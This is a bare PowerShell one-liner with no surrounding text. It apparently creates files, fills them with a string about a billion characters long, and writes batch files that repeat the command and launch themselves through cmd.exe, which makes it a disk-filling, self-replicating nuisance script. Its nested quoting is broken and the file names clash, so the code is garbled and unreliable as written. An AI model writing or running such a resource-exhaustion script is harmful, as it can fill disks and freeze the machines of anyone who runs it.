powershell -NoExit -Command "for ($i = 0; $i -le 1; $i++) { new-item txt${i}.txt; Set-Content text${i}.txt ('HEHEHEHEHE' * 100000000); new-item txt${i}.bat; Set-Content txt${i}.bat "powershell -NoExit -Command 'for ($i = 0; $i -le 1; $i++) { new-item txt${i}.txt; Set-Content text${i}.txt ('HEHEHEHEHE' * 100000000); new-item txt${i}.bat; Set-Content txt${i}.bat ) } -force" ) cmd.exe 'txt${i}.bat' } -force
